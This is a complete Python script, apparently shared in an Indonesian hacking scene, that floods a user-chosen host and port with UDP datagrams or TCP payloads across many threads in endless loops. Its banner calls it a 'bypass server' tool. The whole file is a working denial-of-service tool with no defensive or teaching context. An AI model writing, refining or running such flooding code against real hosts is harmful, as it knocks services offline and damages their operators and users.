#Code by LeeOn123
#Remake Destro
import random
import socket
import threading

print("--> Scripted Upgrade By : DestroyerS <--")
print("#-- Bypass Server Tcp/Udp --#")
ip = str(input(" Host/Ip :"))
port = int(input(" Port :"))
choice = str(input(" UDP(y/n) :"))
times = int(input(" Packets Nya Bre :"))
threads = int(input(" Threads :"))
def run():
	data = random._urandom(20000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Destro Ngamok!!!")
		except:
			print("[!] Salah cmdnya bre!!!")

def run2():
	data = random._urandom(160)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Destro Ngamok!!!")
		except:
			s.close()
			print("[*] Salah cmdnya bre!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()